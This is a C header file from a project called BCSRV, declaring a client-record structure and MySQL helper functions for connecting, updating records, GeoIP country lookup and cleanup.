//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// BCSRV project. Version 2.7.17.1
//	
// module: db.h
// $Revision: 70 $
// $Date: 2014-07-22 14:01:15 +0400 (Вт, 22 июл 2014) $
// description:
//  MySQL database abstraction module definitions.


#define	wczMinus	L'-'

#define		BC_RECORD_FLAG_ACTIVE	1

// BC-Database record structure
typedef struct _BC_RECORD
{
	SYSTEMTIME	CreateTime;
	SYSTEMTIME	LastAccessTime;
	USHORT		ServerPort;
	USHORT		ClientPort;
	ULONG		Flags;
	ULONG		LoadPct;
	ULONG		Address;
	CHAR		CountryCode[4];
	BC_ID		UserId;
} BC_RECORD, *PBC_RECORD;

//
//	Connects to the specified database. Returns the connection handle.
//
WINERROR DbConnect(
	PHANDLE	pHandle,	// variable that receives the connection handle
	LPSTR	Server,		// server host name or IP address
	ULONG	Port,		// server TCP port
	LPSTR	Name,		// database name
	LPSTR	User,		// user name
	LPSTR	Password,	// user password
	LPSTR	SslCa,		// path to a SSL certification athority file
	LPSTR	SslCert,	// path to the client's SSL certificate file
	LPSTR	SslKey		// path to the client's SSL key file
	);
//
//	Closes the specified database handle obtained by successfull DbConnect() call.
//
VOID DbClose(
	HANDLE	DbHandle
	);

//
//	Returns  pointer to the last error message for the specified DB handle.
//
LPCSTR	DbGetLastError(
	HANDLE	DbHandle
	);

//
//	Updates BC-Database record.
//
WINERROR DbUpdateRecord(
	HANDLE		DbHandle,
	LPSTR		TableName,
	PBC_RECORD	pRecord
	);


//
//	Queries GeoIp database for the country code for the specified IP address.
//
WINERROR DbQueryIpOriginCode(
	HANDLE	DbHandle,
	LPSTR	TableName,
	ULONG	Address,
	PCHAR	Buffer,
	ULONG	Size
	);



//
//	Cleans up database. Sets all clients inactive, resets load PCT.
//
WINERROR DbCleanupRecords(
	HANDLE		DbHandle,	// Database connection handle
	LPSTR		TableName	// Table name
	);